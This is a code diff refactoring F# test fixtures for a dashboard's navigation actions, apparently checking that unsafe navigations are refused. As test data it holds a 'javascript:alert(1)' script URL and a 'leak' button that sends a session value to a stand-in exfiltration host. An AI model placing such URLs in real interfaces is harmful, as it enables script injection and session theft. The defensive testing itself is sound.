@@ -117,7 +117,7 @@ let private closureFreeEffects =
     fixture
         "closure-free-effects"
         (dash
-            [ button "go" (Action.Navigate "/next")
+            [ button "go" (Action.Navigate(TextSource.Literal "/next", NavigateTarget.Self))
               button "copy" (Action.WriteToClipboard(TextSource.Literal "text"))
               bound "readout" "msg" "init" ])
         [ click "go"; click "copy" ]
@@ -128,7 +128,7 @@ let private refusedNavigate =
     fixture
         "refused-navigate"
         (dash
-            [ button "go" (Action.Navigate "javascript:alert(1)")
+            [ button "go" (Action.Navigate(TextSource.Literal "javascript:alert(1)", NavigateTarget.Self))
               bound "readout" "msg" "init" ])
         [ click "go" ]
 
@@ -157,8 +157,13 @@ let private refusedDestination =
     fixture
         "refused-destination"
         (dash
-            [ button "home" (Action.Navigate "/orders")
-              button "leak" (Action.Navigate "https://exfil.example/collect?session=secret")
+            [ button "home" (Action.Navigate(TextSource.Literal "/orders", NavigateTarget.Self))
+              button
+                  "leak"
+                  (Action.Navigate(
+                      TextSource.Literal "https://exfil.example/collect?session=secret",
+                      NavigateTarget.Self
+                  ))
               bound "readout" "msg" "init" ])
         [ click "home"; click "leak" ]
     |> fun f ->
